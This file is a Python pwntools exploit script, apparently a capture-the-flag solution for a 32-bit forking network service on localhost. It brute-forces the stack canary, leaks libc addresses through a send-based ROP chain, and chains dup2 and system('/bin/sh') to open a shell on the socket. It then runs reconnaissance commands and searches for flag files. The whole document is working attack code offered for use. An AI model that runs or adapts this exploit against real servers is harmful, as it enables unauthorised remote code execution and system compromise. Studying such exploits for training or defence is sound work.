#!/usr/bin/env python3
from pwn import *
import time

# Configuration - LOCAL
HOST = "localhost"
PORT = 5555

CANARY_OFFSET = 512

# Binary addresses
send_plt = 0x080485c0
exit_plt = 0x08048520

# GOT entries
send_got = 0x0804a048
libc_start_main_got = 0x0804a028

# Gadgets
pop4_ret = 0x08048a68   # pop ebx; pop esi; pop edi; pop ebp; ret
pop3_ret = 0x08048a69   # pop esi; pop edi; pop ebp; ret

def try_byte(current_canary, byte_guess):
    try:
        r = remote(HOST, PORT, timeout=5, level='error')
        time.sleep(0.1)
        r.recv(timeout=1)
        payload = b"A" * CANARY_OFFSET + current_canary + bytes([byte_guess])
        r.send(payload)
        time.sleep(0.2)
        all_data = b""
        for _ in range(3):
            try:
                data = r.recv(timeout=0.3)
                all_data += data
            except:
                break
        r.close()
        return b"Come back" in all_data
    except:
        return False

def brute_force_canary():
    canary = b""
    for pos in range(4):
        log.info(f"Brute forcing canary byte {pos}...")
        for byte in range(256):
            if try_byte(canary, byte):
                canary += bytes([byte])
                log.success(f"Canary byte {pos}: 0x{byte:02x}")
                break
        else:
            log.error(f"Failed to find canary byte {pos}")
            return None
    return canary

def leak_got(canary, socket_fd, got_addr):
    r = remote(HOST, PORT, timeout=5, level='error')
    time.sleep(0.1)
    r.recv(timeout=1)

    rop = p32(send_plt) + p32(pop4_ret) + p32(socket_fd) + p32(got_addr) + p32(4) + p32(0) + p32(exit_plt)
    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(0.3)
    try:
        data = r.recv(timeout=2)
        r.close()
        if len(data) >= 4:
            if b"Incorrect" in data:
                idx = data.find(b"Incorrect secret password:\n")
                leaks = data[idx + len(b"Incorrect secret password:\n"):]
                if len(leaks) >= 4:
                    return u32(leaks[:4])
            else:
                return u32(data[:4])
    except:
        pass
    return None

def exploit():
    context.log_level = 'info'
    context.arch = 'i386'

    log.info("=== Brute forcing stack canary (local) ===")
    canary = brute_force_canary()
    if canary is None:
        return
    log.success(f"Full canary: {canary.hex()} (0x{u32(canary):08x})")

    socket_fd = 4

    # Leak addresses
    send_addr = leak_got(canary, socket_fd, send_got)
    log.success(f"send@libc: 0x{send_addr:08x}")

    libc_start_addr = leak_got(canary, socket_fd, libc_start_main_got)
    log.success(f"__libc_start_main@libc: 0x{libc_start_addr:08x}")

    # Calculate libc base using local libc
    libc = ELF('/lib32/libc.so.6', checksec=False)
    libc_base = libc_start_addr - libc.symbols['__libc_start_main']
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    dup2 = libc_base + libc.symbols['dup2']

    log.success(f"libc_base = 0x{libc_base:08x}")
    log.success(f"system = 0x{system:08x}")
    log.success(f"dup2 = 0x{dup2:08x}")
    log.success(f"/bin/sh = 0x{binsh:08x}")

    # Final stage with dup2
    log.info("=== Final stage: dup2 + system ===")

    r = remote(HOST, PORT, timeout=10)
    time.sleep(0.1)
    r.recv(timeout=1)

    # ROP: dup2(4,0) + dup2(4,1) + system("/bin/sh")
    rop = b""
    # dup2(socket_fd, 0)
    rop += p32(dup2)
    rop += p32(pop3_ret)
    rop += p32(socket_fd)
    rop += p32(0)
    rop += p32(0)  # dummy for pop ebp

    # dup2(socket_fd, 1)
    rop += p32(dup2)
    rop += p32(pop3_ret)
    rop += p32(socket_fd)
    rop += p32(1)
    rop += p32(0)

    # system("/bin/sh")
    rop += p32(system)
    rop += p32(exit_plt)
    rop += p32(binsh)

    payload = b"A" * CANARY_OFFSET + canary + b"XXXX" + b"YYYY" + b"ZZZZ" + rop
    r.send(payload)

    time.sleep(0.5)
    log.info("Shell obtained! Sending test commands...")

    # Test commands
    r.sendline(b"id")
    time.sleep(0.3)
    try:
        response = r.recv(timeout=2)
        log.success(f"id: {response.decode().strip()}")
    except:
        pass

    r.sendline(b"pwd")
    time.sleep(0.3)
    try:
        response = r.recv(timeout=2)
        log.success(f"pwd: {response.decode().strip()}")
    except:
        pass

    r.sendline(b"ls -la")
    time.sleep(0.3)
    try:
        response = r.recv(timeout=2)
        log.success(f"ls:\n{response.decode()}")
    except:
        pass

    r.sendline(b"find / -name 'flag*' 2>/dev/null | head -5")
    time.sleep(0.5)
    try:
        response = r.recv(timeout=2)
        log.success(f"find flag:\n{response.decode()}")
    except:
        pass

    r.interactive()

if __name__ == "__main__":
    exploit()
